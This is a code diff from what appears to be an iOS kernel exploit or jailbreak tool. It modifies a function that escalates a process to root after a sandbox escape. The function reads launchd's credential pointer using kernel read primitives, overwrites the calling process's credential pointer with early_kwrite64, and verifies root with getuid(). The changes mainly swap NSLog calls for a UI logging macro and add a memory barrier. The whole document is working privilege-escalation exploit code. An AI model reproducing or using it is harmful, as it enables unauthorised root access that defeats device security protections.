@@ -269,44 +269,44 @@ static uint64_t sbx_ucredbyproc_nosandbox(uint64_t proc) {
     return 0;
 }
 
-int sandbox_elevate_to_root(uint64_t self_proc) {
-    // proc_find_by_name walks the entire proc list reading names via kread —
-    // after sandbox_escape one of those reads can land on a bad pointer → crash.
-    // proc_find(1) is safe: it stops as soon as it finds pid 1 (launchd),
-    // which is always near the head of the list.
-    uint64_t launchd = proc_find(1);
-    if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX] elevate: could not find launchd (pid 1)");
-        return -1;
-    }
-    NSLog(@"[SBX] elevate: launchd proc: 0x%llx", launchd);
+// UI log callback — set from ADSRootViewController before calling elevate
+void (*sbx_ui_log)(NSString *) = NULL;
+#define ELOG(fmt, ...) do {     NSString *_s = [NSString stringWithFormat:@"[elv] " fmt, ##__VA_ARGS__];     NSLog(@"%@", _s);     if (sbx_ui_log) dispatch_async(dispatch_get_main_queue(), ^{ sbx_ui_log(_s); }); } while(0)
 
-    // launchd has no sandbox — sbx_ucredbyproc would return 0.
-    // Use nosandbox variant that only requires cr_label to be a kernel ptr.
-    uint64_t launchducred = sbx_ucredbyproc_nosandbox(launchd);
-    if (!launchducred) {
-        NSLog(@"[SBX] elevate: failed to get ucred from launchd");
+int sandbox_elevate_to_root(uint64_t self_proc) {
+    uint64_t launchd = proc_find(1);
+    ELOG(@"launchd proc_find(1): 0x%llx", launchd);
+    if (!launchd || launchd == (uint64_t)-1) {
+        ELOG(@"could not find launchd");
         return -1;
     }
-    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);
+
+    uint64_t launchducred = sbx_ucredbyproc_nosandbox(launchd);
+    ELOG(@"launchd ucred: 0x%llx", launchducred);
+    if (!launchducred) {
+        ELOG(@"failed to get ucred from launchd");
+        return -1;
+    }
 
     if (!self_proc) {
-        NSLog(@"[SBX] elevate: failed to get our proc");
+        ELOG(@"self_proc is NULL");
         return -1;
     }
-    NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);
 
     uint64_t ourucredraw = early_kread64(self_proc + 0x10);
     uint64_t ourucred = S(ourucredraw);
-    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);
+    ELOG(@"our ucred raw=0x%llx stripped=0x%llx", ourucredraw, ourucred);
 
     early_kwrite64(self_proc + 0x10, launchducred);
+    __asm__ volatile("dsb sy" ::: "memory");
 
-    if (getuid() == 0) {
-        NSLog(@"[SBX] elevate success!");
+    int uid = getuid();
+    ELOG(@"uid after write: %d", uid);
+    if (uid == 0) {
+        ELOG(@"SUCCESS");
         return 0;
     }
 
-    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
+    ELOG(@"failed uid=%d", uid);
     return -1;
 }
